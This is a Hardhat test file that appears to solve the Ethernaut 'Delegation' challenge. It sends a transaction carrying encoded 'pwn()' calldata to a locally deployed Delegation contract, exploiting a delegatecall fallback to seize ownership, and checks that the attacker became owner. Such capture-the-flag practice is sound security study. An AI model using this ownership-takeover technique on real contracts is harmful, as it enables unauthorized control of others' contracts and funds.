import { expect } from "chai";
import { ethers } from "hardhat";

import { Delegate } from '../typechain-types';
import { Delegation } from '../typechain-types';
import { TriggerDelegation } from '../typechain-types';

import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { deployContracts } from '../scripts/deploy';

const CONTRACT_NAME = "TriggerDelegation";

describe(CONTRACT_NAME, async () => {
  let delegate: Delegate;
  let delegation: Delegation;
  let triggerDelegation: TriggerDelegation;
  let owner: SignerWithAddress;
  let sender: SignerWithAddress;
  let randomAddress: SignerWithAddress;
  let txn;

  before(async () => {
      [owner, sender, randomAddress] = await ethers.getSigners();

      // Harhdat Runtime Environment
      const test = true;
      [delegate, delegation, triggerDelegation] = await deployContracts(test);

      // Localhost deployed contracts
      // forceContract = await ethers.getContractAt(Force.abi, CONTRACT_ADDRESS_FORCE, owner);
      // ethernautContract = await ethers.getContractAt(EthernautForce.abi, CONTRACT_ADDRESS_ETHERNAUT_FORCE, owner);
      // triggerContract = await ethers.getContractAt(TriggerEthernautForce.abi, CONTRACT_ADDRESS_TRIGGER_FORCE, owner);
    });

  describe("DelegateCall contract", () => {  
    // it("should gain owner access", async () => {
    //   console.log(`Owner: ${await delegation.owner()}`);
    //   await triggerDelegation.safeDelegate(delegation.address);

    //   expect(await delegation.owner()).to.equal(triggerDelegation.address);
    // });
    it("should gain owner access", async () => {
      const ABI = ["function pwn()"];
      const Interface = new ethers.utils.Interface(ABI);
      const data = Interface.encodeFunctionData('pwn', []);
 
      txn = await randomAddress.sendTransaction({
        from: randomAddress.address, 
        to: delegation.address, 
        data: data,
        gasLimit: 200000
      });
    
      console.log(txn);

      expect(await delegation.owner()).to.equal(randomAddress.address);
      });
  });
});

